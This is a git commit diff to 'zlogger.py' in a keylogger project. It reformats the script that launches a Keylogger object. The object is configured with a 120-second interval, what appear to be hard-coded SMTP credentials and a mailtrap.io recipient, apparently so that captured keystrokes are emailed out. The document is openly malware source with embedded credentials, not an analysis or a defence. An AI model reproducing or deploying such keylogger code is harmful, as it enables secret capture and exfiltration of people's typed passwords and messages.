62cc6200012a34eb18fdc276053f0a5c28fe0d83
Robert Paruch <roobbb@live.com>
2020-07-14 01:52:22 -0700

    Update zlogger.py

--- keylogger/zlogger.py
+++ keylogger/zlogger.py
@@ -1,4 +1,4 @@
 import keylogger
 
-my_keylogger = keylogger.Keylogger(
-    120, 'b06ffc432e3884', 'a5e72032e9c491', 'to@smtp.mailtrap.io')
+keylogger.Keylogger(120, 'b06ffc432e3884',
+                    'a5e72032e9c491', 'to@smtp.mailtrap.io')
